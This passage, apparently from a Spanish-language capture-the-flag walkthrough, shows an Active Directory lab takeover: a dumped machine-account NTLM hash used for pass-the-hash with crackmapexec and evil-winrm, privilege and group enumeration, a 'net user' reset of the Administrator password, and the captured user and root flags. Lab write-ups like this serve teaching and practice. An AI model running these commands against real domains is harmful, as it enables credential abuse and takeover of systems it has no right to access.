FileServer$:2065:aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559:::
```

Ya que es del `servicio` que hemos descuvierto de su `TGT`, por lo que vamos a utilizar dicho `hash` para utilizarlo como contraseña y probar si funciona en el servidor `SMB`.

### crackmapexec

```shell
crackmapexec smb <IP> -u FileServer$ -H 'aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559' --shares
```

Info:

```
SMB         192.168.28.9    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         192.168.28.9    445    DC01             [+] SOUPEDECODE.LOCAL\FileServer$:e41da7e79a4c76dbd9cf79d1cb325559 (Pwn3d!)
SMB         192.168.28.9    445    DC01             [+] Enumerated shares
SMB         192.168.28.9    445    DC01             Share           Permissions     Remark
SMB         192.168.28.9    445    DC01             -----           -----------     ------
SMB         192.168.28.9    445    DC01             ADMIN$          READ,WRITE      Remote Admin
SMB         192.168.28.9    445    DC01             backup                          
SMB         192.168.28.9    445    DC01             C$              READ,WRITE      Default share
SMB         192.168.28.9    445    DC01             IPC$            READ            Remote IPC
SMB         192.168.28.9    445    DC01             NETLOGON        READ,WRITE      Logon server share 
SMB         192.168.28.9    445    DC01             SYSVOL          READ            Logon server share 
SMB         192.168.28.9    445    DC01             Users 
```

Vemos que si funciona de esta forma, por lo que vamos a ejecutar codigo de forma remota mediante esta herramienta:

## Escalate user fileserver$

```shell
crackmapexec smb <IP> -u FileServer$ -H 'aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559' -x 'whoami'
```

Info:

```
SMB         192.168.28.9    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         192.168.28.9    445    DC01             [+] SOUPEDECODE.LOCAL\FileServer$:e41da7e79a4c76dbd9cf79d1cb325559 (Pwn3d!)
SMB         192.168.28.9    445    DC01             [+] Executed command 
SMB         192.168.28.9    445    DC01             soupedecode\fileserver$
```

Vemos que funciona, tambien sabemos que tiene `WinRM` en el servidor de `Windows` por lo que vamos a probar a conectarnos con el `hash` del usuario directamente de la siguiente forma:

```shell
evil-winrm -i <IP> -u 'FileServer$' -H 'e41da7e79a4c76dbd9cf79d1cb325559'
```

Info:

```
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\FileServer$\Documents> whoami
soupedecode\fileserver$
```

Vemos que ha funcionado, por lo que ya seremos dicho usuario dentro de la maquina victima.

## Escalate Privileges

Vamos a ver que privilegios tenemos con dicho usuario:

```powershell
whoami /priv
```

Info:

```
PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
```

Vemos esta linea bastante interesante:

```
SeImpersonatePrivilege   Impersonate a client after authentication   Enabled
```

Antes de ver que exploit utilizar vamos a ver que version de `Windows Server` estamos:

```powershell
Get-ComputerInfo | Select-Object WindowsProductName, WindowsVersion, OsBuildNumber
```

Info:

```
WindowsProductName                      WindowsVersion OsBuildNumber
------------------                      -------------- -------------
Windows Server 2022 Standard Evaluation 2009           20348
```

Vemos que es un servidor bastante moderno, pero antes vamos a ver a que grupos pertenecemos:

```powershell
whoami /groups
```

Info:

```
GROUP INFORMATION
-----------------

Group Name                                         Type             SID                                         Attributes
================================================== ================ =========================================== ===============================================================
SOUPEDECODE\Domain Computers                       Group            S-1-5-21-2986980474-46765180-2505414164-515 Mandatory group, Enabled by default, Enabled group
Everyone                                           Well-known group S-1-1-0                                     Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access         Alias            S-1-5-32-554                                Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                                      Alias            S-1-5-32-545                                Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                             Alias            S-1-5-32-544                                Mandatory group, Enabled by default, Enabled group, Group owner
NT AUTHORITY\NETWORK                               Well-known group S-1-5-2                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users                   Well-known group S-1-5-11                                    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                     Well-known group S-1-5-15                                    Mandatory group, Enabled by default, Enabled group
SOUPEDECODE\Enterprise Admins                      Group            S-1-5-21-2986980474-46765180-2505414164-519 Mandatory group, Enabled by default, Enabled group
SOUPEDECODE\Denied RODC Password Replication Group Alias            S-1-5-21-2986980474-46765180-2505414164-572 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication                   Well-known group S-1-5-64-10                                 Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level               Label            S-1-16-12288
```

Vemos esta linea de aqui:

```
BUILTIN\Administrators    Alias    S-1-5-32-544    Mandatory group, Enabled by default, Enabled group, Group owner
```

Por lo que vemos pertenecemos al grupo `Administrador`, por lo que podremos hacer lo siguiente:

```powershell
net user Administrator Password123-
```

Info:

```
The command completed successfully.
```

Ahora si nos conectamos desde ese `usuario` mediante `WinRM`:

```shell
evil-winrm -i <IP> -u Administrator -p Password123-
```

Info:

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
soupedecode\administrator
```

Por lo que leeremos la flag de `root` y del `user`.

> user.txt

```
6bab1f09a7403980bfeb4c2b412be47b
```

> root.txt

```
a9564ebc3289b7a14551baf8ad5ec60a
```
